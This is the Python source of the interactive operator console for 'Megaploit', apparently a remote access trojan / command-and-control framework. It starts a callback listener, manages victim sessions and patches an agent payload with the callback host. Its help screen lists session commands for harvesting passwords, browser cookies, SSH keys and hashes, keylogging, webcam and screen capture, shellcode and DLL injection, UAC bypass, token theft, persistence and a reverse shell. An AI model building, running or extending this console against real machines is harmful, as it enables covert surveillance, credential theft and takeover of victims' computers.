"""
megaploit.server.cli
~~~~~~~~~~~~~~~~~~~~
Metasploit-style interactive C2 console.

Features
--------
* Animated gradient ASCII banner on startup
* Colour-coded prompt that changes between global context and session context
* Spinner animation while waiting for a connection
* `sessions` command to list/switch between multiple simultaneous sessions
* Tab-completion via readline (where available)
* `use <id>` to switch into a session
* `back` to return to the global prompt
* `help` in any context
* Graceful SIGINT / EOFError handling
"""

from __future__ import annotations

import os
import queue
import re
import ssl
import sys
import threading
import time
import py_compile
from typing import Optional

try:
    import readline  # enables arrow-key history & tab completion
    _HAS_READLINE = True
except ImportError:
    _HAS_READLINE = False

from megaploit.core.crypto import load_key, key_fingerprint
from megaploit.server.commands import dispatch, all_commands, CommandResult
from megaploit.server.listener import Listener, build_ssl_context
from megaploit.server.session import Session
from megaploit.toolbox.registry import registry as _tool_registry
from megaploit.toolbox import installer as _installer
from megaploit.toolbox.updater import UpdateChecker as _UpdateChecker
from megaploit.plugins.loader import plugin_loader as _plugin_loader
from megaploit.plugins.runner import run_plugin_command as _run_plugin_cmd

# ---------------------------------------------------------------------------
# ANSI colour / style helpers
# ---------------------------------------------------------------------------

_RESET   = "\033[0m"
_BOLD    = "\033[1m"
_DIM     = "\033[2m"
_ITALIC  = "\033[3m"
_UL      = "\033[4m"        # underline

# Standard foreground colours
_RED     = "\033[91m"
_GREEN   = "\033[92m"
_YELLOW  = "\033[93m"
_BLUE    = "\033[94m"
_MAGENTA = "\033[95m"
_CYAN    = "\033[96m"
_WHITE   = "\033[97m"
_GREY    = "\033[90m"

# 256-colour palette helpers  (fall back gracefully on limited terminals)
def _fg256(n: int, text: str) -> str:
    return f"\033[38;5;{n}m{text}{_RESET}"

def _c(text: str, *codes: str) -> str:
    """Wrap *text* in ANSI escape codes, reset at end."""
    return "".join(codes) + text + _RESET


def ok(msg: str)   -> str: return _c(f"[+] {msg}", _GREEN)
def err(msg: str)  -> str: return _c(f"[-] {msg}", _RED)
def info(msg: str) -> str: return _c(f"[*] {msg}", _CYAN)
def warn(msg: str) -> str: return _c(f"[!] {msg}", _YELLOW)


# ---------------------------------------------------------------------------
# Layout helpers  (boxes, rules, padding)
# ---------------------------------------------------------------------------

_TW = 78   # target terminal width

def _rule(char: str = "─", width: int = _TW, color: str = _GREY) -> str:
    return _c("  " + char * (width - 2), color)

def _box_top(title: str, width: int = _TW, color: str = _CYAN) -> str:
    inner = width - 4
    title_str = f" {title} "
    pad = inner - len(title_str)
    left = pad // 2
    right = pad - left
    return _c(f"  ╭{'─' * left}{title_str}{'─' * right}╮", color)

def _box_bot(width: int = _TW, color: str = _CYAN) -> str:
    return _c(f"  ╰{'─' * (width - 4)}╯", color)

def _box_row(text: str, width: int = _TW, color: str = _CYAN) -> str:
    inner = width - 4
    # strip ANSI for length measurement
    visible = re.sub(r'\033\[[0-9;]*m', '', text)
    pad = max(0, inner - len(visible))
    return _c("  │", color) + text + " " * pad + _c("│", color)


def _section(title: str, color: str = _CYAN) -> str:
    """Return a compact section header line."""
    bar = "━" * 3
    return f"\n  {_c(bar, color)} {_c(title, _BOLD, color)} {_c(bar, color)}"


def _kv(key: str, val: str, kw: int = 18) -> str:
    return f"  {_c(key + ':', _GREY):<{kw + 8}}  {val}"


# ---------------------------------------------------------------------------
# Progress bar  (used during toolbox install)
# ---------------------------------------------------------------------------

class _ProgressBar:
    """
    A simple inline progress bar that overwrites itself on the same line.
    Driven externally by calling .step() or .set_label().
    """
    _BAR_WIDTH = 30

    def __init__(self, total: int = 100, label: str = "") -> None:
        self._total   = max(total, 1)
        self._current = 0
        self._label   = label
        self._done    = False

    def set_label(self, label: str) -> None:
        self._label = label
        self._render()

    def step(self, n: int = 1) -> None:
        self._current = min(self._current + n, self._total)
        self._render()

    def finish(self) -> None:
        self._current = self._total
        self._render()
        sys.stdout.write("\n")
        sys.stdout.flush()
        self._done = True

    def _render(self) -> None:
        if self._done:
            return
        pct  = self._current / self._total
        fill = int(pct * self._BAR_WIDTH)
        bar  = _c("█" * fill, _CYAN) + _c("░" * (self._BAR_WIDTH - fill), _GREY)
        pct_str = _c(f"{int(pct * 100):>3}%", _BOLD, _WHITE)
        label = self._label[:30].ljust(30)
        line  = f"\r  {bar} {pct_str}  {_c(label, _GREY)} "
        sys.stdout.write(line)
        sys.stdout.flush()


# ---------------------------------------------------------------------------
# ASCII banner  (gradient red → dim)
# ---------------------------------------------------------------------------

_BANNER_LINES = [
    r"  ███╗   ███╗███████╗ ██████╗  █████╗ ██████╗ ██╗      ██████╗ ██╗████████╗",
    r"  ████╗ ████║██╔════╝██╔════╝ ██╔══██╗██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝",
    r"  ██╔████╔██║█████╗  ██║  ███╗███████║██████╔╝██║     ██║   ██║██║   ██║   ",
    r"  ██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║██╔═══╝ ██║     ██║   ██║██║   ██║   ",
    r"  ██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║██║     ███████╗╚██████╔╝██║   ██║   ",
    r"  ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝  ",
]

# 256-colour gradient: bright red → dark red per line
_BANNER_COLOURS = [196, 160, 124, 88, 52, 238]

_VERSION  = "v2.2.0"
_SUBTITLE = "Professional Remote Access Framework"
_TAGLINE  = "For Authorized Use Only"

# ---------------------------------------------------------------------------
# Changelog  (shown after the banner on startup; `whats new` to re-show)
# ---------------------------------------------------------------------------

_CHANGELOG: list[tuple[str, list[str]]] = [
    ("Console", [
        "256-colour gradient banner, rounded config box, live session badge",
        "Progress bar during toolbox install; install result in a green box",
        "toolbox list  →  LANG column + ●/○ dots;  search  →  inline tags",
        "Dangerous-command prompt redesigned: ⚠  +  styled YES confirmation",
        "help  uses  ━━━ Section ━━━  headers; options in yellow; set uses  →",
    ]),
    ("Toolbox installer", [
        "Go: explicit  -o <name>  output; fallback  go run ./...  (no bare .go exec)",
        "Rust: scans target/release/ for any binary; fallback  cargo run --release --",
        "Java: fallback  mvn exec:java  /  gradle run  when no jar produced",
        "Binary/C: fallback  make run  when cmake/make produces nothing",
        "Build steps now individually try/except — one failure warns and continues",
        "_find_binary: blocklist replaces '.' heuristic; versioned names work",
        "New  toolbox rebuild <name>  — re-builds in-place without git pull",
        "toolbox update  now refreshes  entry  + run_cmd  after rebuild",
    ]),
    ("Auto-update", [
        "--auto-update flag: tools updated automatically in the background",
        "set auto_update on/off  toggles it at runtime without restarting",
        "[✓] / [✗]  notifications shown between prompts after each attempt",
    ]),
    ("Capture & streaming", [
        "screenshot: mss+cv2 JPEG q85 in-memory — ~10× smaller, no tmp file",
        "timelapse: all frames JPEG in-memory; ZIP_STORED; cap raised → 120",
        "screenrecord: monotonic pacing, 1280px scaled, mp4v MP4, fps+scale args",
        "Camera: 20 fps, 1280px, adaptive JPEG 40–85, monotonic loop, frame lock",
    ]),
]


def _print_changelog() -> None:
    """Print the what's-new section — called once on startup, re-callable via 'whats new'."""
    print(_rule("─", color=_GREY))
    tag  = _c(f"  What's new in {_VERSION}", _BOLD, _WHITE)
    hint = _c("  (type  whats new  to re-show)", _DIM)
    print(f"{tag}  {hint}")
    print()
    for category, bullets in _CHANGELOG:
        print(f"  {_c('▸', _CYAN)} {_c(category, _BOLD, _WHITE)}")
        for b in bullets:
            print(f"    {_c('·', _GREY)} {_c(b, _GREY)}")
        print()
    print(_rule("─", color=_GREY))
    print()


def _print_banner() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    print()
    for line, col in zip(_BANNER_LINES, _BANNER_COLOURS):
        print(_fg256(col, line))
        time.sleep(0.045)
    print()
    # Centred subtitle row
    subtitle = f"  {_c(_SUBTITLE, _BOLD, _WHITE)}  {_c('│', _GREY)}  {_c(_VERSION, _CYAN)}  {_c('│', _GREY)}  {_c(_TAGLINE, _GREY)}"
    print(subtitle)
    print(_rule("─", color=_GREY))
    print()
    _print_changelog()


# ---------------------------------------------------------------------------
# Spinner  (braille + label)
# ---------------------------------------------------------------------------

class _Spinner:
    _FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

    def __init__(self, message: str) -> None:
        self._msg    = message
        self._stop   = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, *_):
        self._stop.set()
        self._thread.join()
        sys.stdout.write("\r" + " " * (_TW) + "\r")
        sys.stdout.flush()

    def _run(self) -> None:
        i = 0
        while not self._stop.is_set():
            frame = _c(self._FRAMES[i % len(self._FRAMES)], _CYAN)
            label = _c(self._msg, _GREY)
            elapsed = _c(f"{(i * 0.08):.1f}s", _DIM)
            sys.stdout.write(f"\r  {frame}  {label}  {elapsed}  ")
            sys.stdout.flush()
            time.sleep(0.08)
            i += 1


# ---------------------------------------------------------------------------
# Session table
# ---------------------------------------------------------------------------

def _print_sessions(sessions: dict[int, Session]) -> None:
    if not sessions:
        print(f"\n  {_c('No active sessions.', _GREY)}\n")
        return
    print()
    cols = f"  {'ID':<5} {'IP ADDRESS':<20} {'PORT':<8} {'UPTIME':<14} {'STATUS'}"
    print(_c(cols, _BOLD, _WHITE))
    print(_rule("─"))
    for sid, sess in sessions.items():
        dot    = _c("●", _GREEN)
        id_str = _c(str(sid), _CYAN, _BOLD)
        ip_str = _c(sess.ip, _WHITE)
        print(f"  {id_str:<14} {ip_str:<29} {sess.port:<8} {sess.uptime:<14} {dot} active")
    print()


# ---------------------------------------------------------------------------
# Tab completion
# ---------------------------------------------------------------------------

_GLOBAL_CMDS  = [
    "sessions", "use", "generate", "set", "help", "clear", "exit",
    "toolbox", "plugins", "whatsnew",
]
_SESSION_CMDS = list(all_commands().keys()) + ["back", "clear"]

def _completer(text: str, state: int) -> Optional[str]:
    tool_names  = [f"toolbox_run {t.name}" for t in _tool_registry.all()]
    plugin_cmds = _plugin_loader.all_command_names()
    pool = _GLOBAL_CMDS + _SESSION_CMDS + tool_names + plugin_cmds
    options = [c for c in pool if c.startswith(text)]
    return options[state] if state < len(options) else None

if _HAS_READLINE:
    readline.set_completer(_completer)
    readline.parse_and_bind("tab: complete")


# ---------------------------------------------------------------------------
# Main CLI class
# ---------------------------------------------------------------------------

class Console:
    """The interactive operator console.  Call run() to start."""

    def __init__(self) -> None:
        self._sessions: dict[int, Session] = {}
        self._sessions_lock = threading.Lock()
        self._new_sessions: queue.Queue[Session] = queue.Queue()
        self._listener: Optional[Listener] = None
        self._updater: Optional[_UpdateChecker] = None

        self.bind_host:   str   = "0.0.0.0"
        self.lhost:       str   = ""
        self.port:        int   = 4444
        self.cert:        str   = ""
        self.key_file:    str   = ""
        self.secret_key:  bytes = b""
        self.allowed_ips: list[str] = []
        self.auto_update: bool  = False

    # ---------------------------------------------------------------
    # Entry point
    # ---------------------------------------------------------------

    def run(self, bind_host: str, lhost: str, port: int,
            cert: str = "", key_file: str = "",
            secret_key_path: str = "secret.key",
            allowed_ips: list[str] | None = None,
            auto_update: bool = False) -> None:

        self.bind_host   = bind_host
        self.lhost       = lhost
        self.port        = port
        self.cert        = cert
        self.key_file    = key_file
        self.secret_key  = load_key(secret_key_path)
        self.allowed_ips = allowed_ips or []
        self.auto_update = auto_update

        _print_banner()

        # ── startup info box ──────────────────────────────────────
        fp = key_fingerprint(self.secret_key)
        tls_val  = _c(f"{cert}", _GREEN) if cert else _c("disabled", _YELLOW)
        upd_val  = _c("on (auto)", _GREEN) if auto_update else _c("notify only", _GREY)
        ip_val   = _c(", ".join(allowed_ips), _GREEN) if allowed_ips else _c("any  ⚠", _YELLOW)

        print(_box_top("Server Configuration"))
        print(_box_row(_kv("LHOST",       _c(lhost, _CYAN))))
        print(_box_row(_kv("Port",        _c(str(port), _CYAN))))
        print(_box_row(_kv("TLS",         tls_val)))
        print(_box_row(_kv("IP allowlist",ip_val)))
        print(_box_row(_kv("Auto-update", upd_val)))
        print(_box_row(_kv("Key fprint",  _c(f"{fp[:8]} {fp[8:]}", _DIM))))
        print(_box_bot())
        print()

        self._start_updater()
        self._load_plugins()
        self._start_listener()
        self._global_loop()

    # ---------------------------------------------------------------
    # Plugin loader
    # ---------------------------------------------------------------

    def _load_plugins(self) -> None:
        loaded, _errs = _plugin_loader.load_all()
        if loaded:
            print(ok(f"Loaded {loaded} plugin(s) from plugins/"))
        for fname, msg in _plugin_loader.errors():
            print(warn(f"Plugin error in '{fname}': {msg}"))

    # ---------------------------------------------------------------
    # Updater
    # ---------------------------------------------------------------

    def _start_updater(self) -> None:
        self._updater = _UpdateChecker(megaploit_dir=".", auto_update=self.auto_update)
        self._updater.start()
        mode = _c("auto-update ON", _GREEN) if self.auto_update else _c("notify only", _GREY)
        print(info(f"Update checker started — {mode}"))

    def _drain_updates(self) -> None:
        if self._updater is None:
            return
        for note in self._updater.drain():
            print(note)

    # ---------------------------------------------------------------
    # Listener management
    # ---------------------------------------------------------------

    def _start_listener(self) -> None:
        ssl_ctx: Optional[ssl.SSLContext] = None
        if self.cert and self.key_file:
            try:
                ssl_ctx = build_ssl_context(self.cert, self.key_file)
                print(ok(f"TLS enabled  ({self.cert})"))
            except ssl.SSLError as e:
                print(err(f"TLS error: {e}"))
                sys.exit(1)
        else:
            print(warn("TLS not configured — traffic is unencrypted."))

        self._listener = Listener(
            bind_host=self.bind_host,
            port=self.port,
            secret_key=self.secret_key,
            on_session=self._on_new_session,
            ssl_context=ssl_ctx,
            allowed_ips=self.allowed_ips or None,
        )
        self._listener.start()
        print(ok(f"Listener ready on {_c(self.bind_host, _CYAN)}:{_c(str(self.port), _CYAN)}"))
        print(info(f"Agents should call back to  {_c(self.lhost, _WHITE)}:{_c(str(self.port), _WHITE)}"))
        print()

    def _on_new_session(self, session: Session) -> None:
        with self._sessions_lock:
            self._sessions[session.id] = session
        self._new_sessions.put(session)

    # ---------------------------------------------------------------
    # New-session notification
    # ---------------------------------------------------------------

    def _drain_new_sessions(self) -> None:
        while not self._new_sessions.empty():
            try:
                sess = self._new_sessions.get_nowait()
                # Draw an eye-catching alert box
                print()
                print(_box_top(f"  ★  NEW SESSION  #{sess.id}  ★  ", color=_GREEN))
                print(_box_row(_kv("Address", _c(f"{sess.ip}:{sess.port}", _WHITE)), color=_GREEN))
                print(_box_row(_kv("Interact", _c(f"use {sess.id}", _CYAN, _BOLD)),  color=_GREEN))
                print(_box_bot(color=_GREEN))
                print()
            except queue.Empty:
                break
        self._drain_updates()

    # ---------------------------------------------------------------
    # Global prompt loop
    # ---------------------------------------------------------------

    def _global_loop(self) -> None:
        print(f"  {_c('Type', _GREY)} {_c('help', _CYAN)} {_c('for commands.', _GREY)}\n")
        while True:
            self._drain_new_sessions()
            try:
                n_sessions = len(self._sessions)
                sess_badge = (
                    _c(f"[{n_sessions}]", _GREEN, _BOLD)
                    if n_sessions else _c("[0]", _GREY)
                )
                prompt = (
                    f"\n{_c('msf', _GREY)}{_c('►', _RED, _BOLD)}"
                    f"{_c('megaploit', _RED, _BOLD)} "
                    f"{sess_badge} {_c('»', _GREY)} "
                )
                raw = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                self._shutdown()
                return

            if not raw:
                continue

            parts = raw.split()
            cmd   = parts[0].lower()
            args  = parts[1:]

            if cmd == "exit":
                self._shutdown()
                return
            elif cmd in ("help", "?"):
                self._global_help()
            elif cmd in ("whats new", "whatsnew", "changelog"):
                _print_changelog()
            elif cmd == "clear":
                os.system("cls" if os.name == "nt" else "clear")
            elif cmd == "sessions":
                with self._sessions_lock:
                    _print_sessions(dict(self._sessions))
            elif cmd == "use":
                self._cmd_use(args)
            elif cmd == "generate":
                self._cmd_generate(args)
            elif cmd == "set":
                self._cmd_set(args)
            elif cmd == "toolbox":
                self._cmd_toolbox(args)
            elif cmd in ("toolbox_run", "toolbox_deploy"):
                print(warn(f"  '{cmd}' must be run inside a session."))
                print(info(f"  Type  use <id>  to enter a session, then run:"))
                print(f"  {_c(cmd, _CYAN)} {' '.join(args) if args else _c('<tool-name>', _GREY)}")
            elif cmd == "plugins":
                self._cmd_plugins(args)
            elif _plugin_loader.is_plugin_command(cmd):
                pc     = _plugin_loader.get_command(cmd)
                result = _run_plugin_cmd(pc, args, lhost=self.lhost, port=self.port)
                self._print_result(result)
            else:
                print(err(f"Unknown command: {_c(cmd, _BOLD)}  — type {_c('help', _CYAN)}"))

    # ---------------------------------------------------------------
    # Session interaction loop
    # ---------------------------------------------------------------

    def _session_loop(self, session: Session) -> None:
        print()
        print(_rule("─", color=_CYAN))
        print(f"  {_c('●', _GREEN)} Session {_c(f'#{session.id}', _CYAN, _BOLD)}  "
              f"{_c(session.ip, _WHITE)}  "
              f"{_c('— type  back  to return', _GREY)}")
        print(_rule("─", color=_CYAN))
        print()

        while True:
            self._drain_new_sessions()
            try:
                prompt = (
                    f"\n{_c('msf', _GREY)}{_c('►', _RED, _BOLD)}"
                    f"{_c('megaploit', _RED, _BOLD)}"
                    f" {_c('session', _GREY)}"
                    f"{_c('(', _GREY)}{_c(str(session.id), _CYAN, _BOLD)}{_c(')', _GREY)}"
                    f" {_c('»', _GREY)} "
                )
                raw = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return

            if not raw:
                continue

            parts    = raw.split()
            cmd_name = parts[0].lower()
            args     = parts[1:]

            if cmd_name == "back":
                print(_rule("─", color=_GREY))
                return

            if cmd_name == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue

            if cmd_name == "toolbox":
                print(warn("  'toolbox' is a global command — type  back  first, then use:"))
                print(f"  {_c('toolbox install <url> <name>', _CYAN)}  /  "
                      f"{_c('toolbox list', _CYAN)}  /  "
                      f"{_c('toolbox info <name>', _CYAN)}")
                continue

            # Dangerous command confirmation
            cmds = all_commands()
            is_dangerous = (
                (cmd_name in cmds and cmds[cmd_name].dangerous)
                or (
                    _plugin_loader.is_plugin_command(cmd_name)
                    and _plugin_loader.get_command(cmd_name).dangerous
                )
            )
            if is_dangerous:
                print()
                print(_c(f"  ⚠  '{cmd_name}' is a destructive operation.", _YELLOW, _BOLD))
                confirm = input(_c("     Type YES to confirm: ", _YELLOW)).strip()
                if confirm != "YES":
                    print(warn("  Cancelled."))
                    continue

            if _plugin_loader.is_plugin_command(cmd_name):
                pc     = _plugin_loader.get_command(cmd_name)
                result = _run_plugin_cmd(
                    pc, args,
                    session=session,
                    lhost=self.lhost,
                    port=self.port,
                )
                self._print_result(result)
                if result.close_session:
                    with self._sessions_lock:
                        self._sessions.pop(session.id, None)
                    session.close()
                    print(info(f"Session #{session.id} closed."))
                    return
                continue

            result: CommandResult = dispatch(session, raw)
            self._print_result(result)

            if result.close_session:
                with self._sessions_lock:
                    self._sessions.pop(session.id, None)
                session.close()
                print(info(f"Session #{session.id} closed."))
                return

    # ---------------------------------------------------------------
    # Result renderer
    # ---------------------------------------------------------------

    def _print_result(self, result: CommandResult) -> None:
        if not result.output:
            return
        if result.ok:
            out = result.output
            out = re.sub(r"^\[\+\]", _c("[+]", _GREEN),  out, flags=re.MULTILINE)
            out = re.sub(r"^\[-\]",  _c("[-]", _RED),    out, flags=re.MULTILINE)
            out = re.sub(r"^\[\*\]", _c("[*]", _CYAN),   out, flags=re.MULTILINE)
            out = re.sub(r"^\[!\]",  _c("[!]", _YELLOW), out, flags=re.MULTILINE)
            print(out)
        else:
            print(err(result.output))

    # ---------------------------------------------------------------
    # Sub-commands
    # ---------------------------------------------------------------

    def _cmd_use(self, args: list[str]) -> None:
        if not args or not args[0].isdigit():
            print(err("Usage: use <session_id>"))
            return
        sid = int(args[0])
        with self._sessions_lock:
            session = self._sessions.get(sid)
        if not session:
            print(err(f"No session with ID {sid}"))
            return
        self._session_loop(session)

    def _cmd_generate(self, args: list[str]) -> None:
        if not self.lhost or not self.port:
            print(err("Set LHOST and PORT first:  set lhost <ip>  /  set port <port>"))
            return
        use_tls = "--tls" in args or "-t" in args
        _patch_agent(self.lhost, self.port, use_tls=use_tls)
        if "--compile" in args or "-c" in args:
            try:
                py_compile.compile("agent.py", doraise=True)
                print(ok("agent.py byte-compiled"))
            except py_compile.PyCompileError as e:
                print(err(f"Compile error: {e}"))

    def _cmd_set(self, args: list[str]) -> None:
        if len(args) != 2:
            print(err("Usage: set <option> <value>"))
            _show_options(self)
            return
        key, val = args[0].lower(), args[1]
        if key == "lhost":
            self.lhost = val
            print(ok(f"lhost  →  {_c(val, _CYAN)}"))
        elif key == "port":
            try:
                self.port = int(val)
                print(ok(f"port  →  {_c(val, _CYAN)}"))
            except ValueError:
                print(err("port must be an integer"))
        elif key == "cert":
            self.cert = val
            print(ok(f"cert  →  {_c(val, _CYAN)}"))
        elif key == "key":
            self.key_file = val
            print(ok(f"key  →  {_c(val, _CYAN)}"))
        elif key == "auto_update":
            if val.lower() in ("on", "true", "1", "yes"):
                self.auto_update = True
                if self._updater:
                    self._updater.auto_update = True
                print(ok(f"auto_update  →  {_c('on', _GREEN)}  (tools update automatically)"))
            elif val.lower() in ("off", "false", "0", "no"):
                self.auto_update = False
                if self._updater:
                    self._updater.auto_update = False
                print(ok(f"auto_update  →  {_c('off', _GREY)}  (notifications only)"))
            else:
                print(err("auto_update must be  on  or  off"))
        else:
            print(err(f"Unknown option: {_c(key, _BOLD)}"))

    # ---------------------------------------------------------------
    # Help screen
    # ---------------------------------------------------------------

    def _global_help(self) -> None:
        tools   = _tool_registry.all()
        plugins = _plugin_loader.plugins()

        def _cmd_row(cmd: str, desc: str) -> str:
            return f"  {_c(cmd, _CYAN):<{32 + 9}}  {_c(desc, _GREY)}"

        def _opt_row(key: str, val: str) -> str:
            val_col = _c(val, _WHITE) if val not in ("(not set)", "(none)", "off") else _c(val, _DIM)
            return f"  {_c(key, _YELLOW):<{16 + 9}}  {val_col}"

        lines = [
            "",
            _section("Global Commands"),
            "",
            _cmd_row("sessions",                    "List active sessions"),
            _cmd_row("use <id>",                    "Interact with a session"),
            _cmd_row("generate [-c] [--tls]",       "Patch agent.py  (-c compile, --tls enable TLS)"),
            _cmd_row("set <option> <value>",        "Set lhost / port / cert / key / auto_update"),
            _cmd_row("toolbox install <url> <name>","Install a GitHub tool"),
            _cmd_row("toolbox list",                "Show installed tools"),
            _cmd_row("toolbox search <query>",      "Search tools by name / tag / description"),
            _cmd_row("toolbox info <name>",         "Show tool details"),
            _cmd_row("toolbox update <name>",       "Pull latest changes"),
            _cmd_row("toolbox rebuild <name>",      "Re-build in place (no pull)"),
            _cmd_row("toolbox remove <name>",       "Uninstall a tool"),
            _cmd_row("toolbox set-entry <name> <p>","Override the entry-point path"),
            _cmd_row("plugins [reload|info]",       "Manage loaded plugins"),
            _cmd_row("whats new",                   f"Re-show the {_VERSION} changelog"),
            _cmd_row("clear",                       "Clear the terminal"),
            _cmd_row("exit",                        "Quit Megaploit"),
            "",
            _section("Options"),
            "",
            _opt_row("lhost",        self.lhost or "(not set)"),
            _opt_row("port",         str(self.port)),
            _opt_row("cert",         self.cert or "(none)"),
            _opt_row("key",          self.key_file or "(none)"),
            _opt_row("auto_update",  "on" if self.auto_update else "off"),
            "",
            _section("Session Commands  (inside  use <id>)"),
            "",
            _cmd_row("File transfer",   "upload  download  zip_download"),
            _cmd_row("Screen / audio",  "screenshot  screenshot_timelapse  record  mic_level"),
            _cmd_row("Screen record",   "screenrecord <secs>"),
            _cmd_row("Streaming",       "screen_stream  webcam"),
            _cmd_row("Credentials",     "hashdump  wifi_passwords  browser_history"),
            _cmd_row("Browser",         "browser_creds [cookies|passwords|all]"),
            _cmd_row("Adv. creds",      "cred_vault  ssh_harvest  sudo_sniff"),
            _cmd_row("Search",          "search <path> <keyword>"),
            _cmd_row("Clipboard",       "getclip  setclip"),
            _cmd_row("Network pivot",   "portfwd  socks5  " + _c("reverse_shell [!]", _YELLOW)),
            _cmd_row("Awareness",       "idle_time  sysinfo  mic_level"),
            _cmd_row("GUI / input",     "msgbox  mouse_move  type_keys  lock_screen"),
            _cmd_row("Injection",       _c("inject_shellcode [!]  dll_inject [!]", _YELLOW)),
            _cmd_row("Priv. esc.",      _c("uac_bypass [!]  token_steal [!]", _YELLOW)),
            _cmd_row("LOLBins",         _c("living_off_land [!]", _YELLOW)),
            _cmd_row("Persistence",     "persist  keylog_start/dump/stop"),
            _cmd_row("Cleanup",         _c("self_destruct [!]", _YELLOW)),
            _cmd_row("Toolbox",         "toolbox_run <name>  toolbox_deploy <name>"),
            _cmd_row("Shell passthrough","any unrecognised command runs as shell"),
            "",
        ]

        if tools:
            lines += [_section("Installed Tools"), ""]
            for t in tools:
                dot    = _c("●", _GREEN) if t.is_installed else _c("○", _RED)
                lang   = _c(f"[{t.lang}]", _DIM)
                desc   = t.description[:48] + ("…" if len(t.description) > 48 else "")
                lines.append(
                    f"  {dot} {_c(t.name, _CYAN, _BOLD):<{20 + 9}}  {lang:<{10 + 9}}  {_c(desc, _GREY)}"
                )
            lines.append("")

        if plugins:
            lines += [_section("Loaded Plugins"), ""]
            for p in plugins:
                ncmds = _c(f"{len(p.commands)} cmd", _DIM)
                desc  = p.description[:42] + ("…" if len(p.description) > 42 else "")
                lines.append(
                    f"  {_c('◆', _MAGENTA)} {_c(p.name, _CYAN):<{20 + 9}}  "
                    f"{_c(f'v{p.version}', _DIM):<{10 + 9}}  {_c(desc, _GREY)}  {ncmds}"
                )
            lines.append("")

        print("\n".join(lines))

    # ---------------------------------------------------------------
    # Toolbox command dispatcher
    # ---------------------------------------------------------------

    def _cmd_toolbox(self, args: list[str]) -> None:
        if not args:
            self._toolbox_help()
            return

        sub  = args[0].lower()
        rest = args[1:]

        dispatch_map = {
            "install":       lambda: self._toolbox_install(rest),
            "list":          lambda: self._toolbox_list(),
            "search":        lambda: self._toolbox_search(rest),
            "info":          lambda: self._toolbox_info(rest),
            "remove":        lambda: self._toolbox_remove(rest),
            "update":        lambda: self._toolbox_update(rest),
            "update-all":    lambda: self._toolbox_update_all(),
            "check-updates": lambda: self._toolbox_check_updates(),
            "rebuild":       lambda: self._toolbox_rebuild(rest),
            "set-entry":     lambda: self._toolbox_set_entry(rest),
        }
        fn = dispatch_map.get(sub)
        if fn:
            fn()
        else:
            print(err(f"Unknown toolbox sub-command: {_c(sub, _BOLD)}"))
            self._toolbox_help()

    # ------------------------------------------------------------------

    def _toolbox_install(self, args: list[str]) -> None:
        if len(args) < 2:
            print(err("Usage: toolbox install <repo_url> <name> [description] [--tags a,b]"))
            return

        repo_url    = args[0]
        name        = args[1]
        description = ""
        tags: list[str] = []
        i = 2
        while i < len(args):
            if args[i] == "--tags" and i + 1 < len(args):
                tags = [t.strip() for t in args[i + 1].split(",")]
                i += 2
            else:
                description += (" " if description else "") + args[i]
                i += 1

        print()
        print(_box_top(f"Installing  {name}"))
        print(_box_row(_kv("Source", _c(repo_url, _GREY))))
        if tags:
            print(_box_row(_kv("Tags", _c(", ".join(tags), _CYAN))))
        print(_box_bot())
        print()

        # Track build stages for a simple progress bar
        _STAGES = ["clone", "detect", "build", "deps", "entry", "register"]
        pb = _ProgressBar(total=len(_STAGES), label="cloning…")

        def _progress(line: str) -> None:
            # Advance bar on recognisable milestones
            if   "[*] Cloning"    in line: pb.set_label("cloning…")
            elif "[*] Detected"   in line: pb.step(); pb.set_label("building…")
            elif "[+] Go build"   in line: pb.step(); pb.set_label("go build…")
            elif "[+] Rust build" in line: pb.step(); pb.set_label("cargo…")
            elif "[+] Maven"      in line: pb.step(); pb.set_label("mvn…")
            elif "[+] npm"        in line: pb.step(); pb.set_label("npm…")
            elif "[+] Python"     in line: pb.step(); pb.set_label("pip…")
            elif "[*] Entry"      in line: pb.step(); pb.set_label("registering…")
            elif "[+]"            in line: pb.step()

        try:
            with _Spinner(f"Cloning {repo_url}…"):
                tool = _installer.install(
                    repo_url=repo_url,
                    name=name,
                    description=description,
                    tags=tags,
                    progress=_progress,
                )
            pb.finish()
            print()
            print(_box_top(f"✓  {name}  installed", color=_GREEN))
            print(_box_row(_kv("Entry-point", _c(tool.entry, _WHITE)),  color=_GREEN))
            print(_box_row(_kv("Language",    _c(tool.lang,  _YELLOW)), color=_GREEN))
            print(_box_row(_kv("Path",        _c(tool.path,  _GREY)),   color=_GREEN))
            print(_box_row(_kv("Run locally", _c(f"toolbox_run {name} [args]", _CYAN)), color=_GREEN))
            print(_box_row(_kv("Deploy",      _c(f"toolbox_deploy {name} [args]", _CYAN)), color=_GREEN))
            print(_box_bot(color=_GREEN))
        except RuntimeError as e:
            pb.finish()
            print(err(str(e)))

    def _toolbox_list(self) -> None:
        tools = _tool_registry.all()
        if not tools:
            print(info(f"No tools installed.  Use:  {_c('toolbox install <url> <name>', _CYAN)}"))
            return
        print()
        hdr = f"  {'':2}{'NAME':<18} {'LANG':<10} {'ENTRY':<22} DESCRIPTION"
        print(_c(hdr, _BOLD, _WHITE))
        print(_rule("─"))
        for t in tools:
            dot  = _c("●", _GREEN) if t.is_installed else _c("○", _RED)
            lang = _c(f"[{t.lang}]", _YELLOW)
            desc = t.description[:36] + ("…" if len(t.description) > 36 else "")
            entry = (t.entry[:20] + "…") if len(t.entry) > 20 else t.entry
            print(f"  {dot} {_c(t.name, _CYAN):<{17 + 9}} {lang:<{10 + 9}} {entry:<22} {_c(desc, _GREY)}")
        print()

    def _toolbox_search(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: toolbox search <query>"))
            return
        query   = " ".join(args)
        results = _tool_registry.search(query)
        if not results:
            print(info(f"No tools match {_c(repr(query), _YELLOW)}."))
            return
        print()
        for t in results:
            dot = _c("●", _GREEN) if t.is_installed else _c("○", _RED)
            print(f"  {dot} {_c(t.name, _CYAN, _BOLD):<{22 + 9}}  {t.description[:60]}")
